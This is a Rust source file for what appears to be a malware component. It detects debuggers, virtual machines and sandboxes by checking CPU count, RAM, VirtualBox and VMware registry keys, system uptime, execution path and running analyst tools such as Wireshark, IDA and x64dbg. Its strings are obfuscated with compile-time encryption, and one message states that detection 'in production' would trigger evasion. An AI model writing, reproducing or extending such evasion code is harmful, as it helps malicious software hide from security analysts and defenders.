/// Anti-analysis and sandbox detection module
/// Currently only prints debug messages - actual evasion logic can be enabled later

use cryptify::encrypt_string;

/// Check if the application is running in a debugger
#[cfg(target_os = "windows")]
pub fn is_debugger_present() -> bool {
    use winapi::um::debugapi::IsDebuggerPresent;
    
    unsafe {
        let result = IsDebuggerPresent() != 0;
        
        if crate::config::SHOW_CLI {
            if result {
                println!("{}", encrypt_string!("[Anti-Analysis] Debugger detected!"));
            } else {
                println!("{}", encrypt_string!("[Anti-Analysis] No debugger detected"));
            }
        }
        
        result
    }
}

#[cfg(not(target_os = "windows"))]
pub fn is_debugger_present() -> bool {
    false
}

/// Check if running in a virtual machine
#[cfg(target_os = "windows")]
pub fn is_virtual_machine() -> bool {
    let mut is_vm = false;
    
    // Check 1: CPU count (VMs often have 1-2 CPUs)
    let cpu_count = num_cpus::get();
    if cpu_count <= 2 {
        if crate::config::SHOW_CLI {
            println!("{} {}", encrypt_string!("[Anti-Analysis] Low CPU count detected:"), cpu_count);
        }
        is_vm = true;
    }
    
    // Check 2: RAM size (VMs often have limited RAM)
    if let Ok(ram_mb) = get_total_ram_mb() {
        if ram_mb < 4096 {
            if crate::config::SHOW_CLI {
                println!("{} {} MB", encrypt_string!("[Anti-Analysis] Low RAM detected:"), ram_mb);
            }
            is_vm = true;
        }
    }
    
    // Check 3: Look for VM-specific registry keys
    if check_vm_registry_keys() {
        if crate::config::SHOW_CLI {
            println!("{}", encrypt_string!("[Anti-Analysis] VM registry keys detected"));
        }
        is_vm = true;
    }
    
    if !is_vm && crate::config::SHOW_CLI {
        println!("{}", encrypt_string!("[Anti-Analysis] No VM indicators detected"));
    }
    
    is_vm
}

#[cfg(not(target_os = "windows"))]
pub fn is_virtual_machine() -> bool {
    false
}

/// Get total system RAM in MB
#[cfg(target_os = "windows")]
fn get_total_ram_mb() -> Result<u64, ()> {
    use winapi::um::sysinfoapi::{MEMORYSTATUSEX, GlobalMemoryStatusEx};
    use std::mem;
    
    unsafe {
        let mut mem_status: MEMORYSTATUSEX = mem::zeroed();
        mem_status.dwLength = mem::size_of::<MEMORYSTATUSEX>() as u32;
        
        if GlobalMemoryStatusEx(&mut mem_status) != 0 {
            let ram_mb = mem_status.ullTotalPhys / (1024 * 1024);
            Ok(ram_mb)
        } else {
            Err(())
        }
    }
}

/// Check for VM-specific registry keys
#[cfg(target_os = "windows")]
fn check_vm_registry_keys() -> bool {
    use std::process::Command;
    
    // Check for common VM identifiers in registry
    let vm_checks = vec![
        r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest",
        r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxMouse",
        r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxService",
        r"HKLM\SYSTEM\CurrentControlSet\Services\vmtoolsd",
        r"HKLM\SYSTEM\CurrentControlSet\Services\vmmouse",
    ];
    
    for key in vm_checks {
        if let Ok(output) = Command::new("reg")
            .args(&["query", key])
            .output()
        {
            if output.status.success() {
                return true;
            }
        }
    }
    
    false
}

/// Check if running in a sandbox environment
#[cfg(target_os = "windows")]
pub fn is_sandbox() -> bool {
    let mut is_sandbox = false;
    
    // Check 1: Uptime (sandboxes often have very recent boot time)
    if let Ok(uptime_seconds) = get_system_uptime_seconds() {
        if uptime_seconds < 600 {  // Less than 10 minutes uptime
            if crate::config::SHOW_CLI {
                println!("{} {} seconds", 
                    encrypt_string!("[Anti-Analysis] Low system uptime detected:"), 
                    uptime_seconds
                );
            }
            is_sandbox = true;
        }
    }
    
    // Check 2: Look for common sandbox/analysis tool processes
    if check_analysis_processes() {
        if crate::config::SHOW_CLI {
            println!("{}", encrypt_string!("[Anti-Analysis] Analysis tools detected"));
        }
        is_sandbox = true;
    }
    
    // Check 3: Check for temp/suspicious execution path
    if let Ok(exe_path) = std::env::current_exe() {
        let path_str = exe_path.to_string_lossy().to_lowercase();
        if path_str.contains("temp") || path_str.contains("tmp") || path_str.contains("sample") {
            if crate::config::SHOW_CLI {
                println!("{} {}", 
                    encrypt_string!("[Anti-Analysis] Suspicious execution path:"), 
                    path_str
                );
            }
            is_sandbox = true;
        }
    }
    
    if !is_sandbox && crate::config::SHOW_CLI {
        println!("{}", encrypt_string!("[Anti-Analysis] No sandbox indicators detected"));
    }
    
    is_sandbox
}

#[cfg(not(target_os = "windows"))]
pub fn is_sandbox() -> bool {
    false
}

/// Get system uptime in seconds
#[cfg(target_os = "windows")]
fn get_system_uptime_seconds() -> Result<u64, ()> {
    use winapi::um::sysinfoapi::GetTickCount64;
    
    unsafe {
        let uptime_ms = GetTickCount64();
        Ok(uptime_ms / 1000)
    }
}

/// Check for analysis tool processes
#[cfg(target_os = "windows")]
fn check_analysis_processes() -> bool {
    use std::process::Command;
    
    let suspicious_processes = vec![
        "procmon", "procexp", "wireshark", "fiddler", "ida", "ollydbg",
        "x64dbg", "windbg", "processhacker", "regshot", "autoruns",
    ];
    
    if let Ok(output) = Command::new("tasklist").output() {
        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
        
        for process in suspicious_processes {
            if output_str.contains(process) {
                return true;
            }
        }
    }
    
    false
}

/// Run all anti-analysis checks and return true if any suspicious environment is detected
pub fn detect_analysis_environment() -> bool {
    if crate::config::SHOW_CLI {
        println!("\n{}", encrypt_string!("=== Running Anti-Analysis Checks ==="));
    }
    
    let debugger = is_debugger_present();
    let vm = is_virtual_machine();
    let sandbox = is_sandbox();
    
    let detected = debugger || vm || sandbox;
    
    if crate::config::SHOW_CLI {
        if detected {
            println!("{}", encrypt_string!("[Anti-Analysis] ⚠ Analysis environment detected!"));
            println!("{}", encrypt_string!("[Anti-Analysis] In production, this would trigger evasion"));
        } else {
            println!("{}", encrypt_string!("[Anti-Analysis] ✓ Environment appears clean"));
        }
        println!("{}", encrypt_string!("=====================================\n"));
    }
    
    detected
}
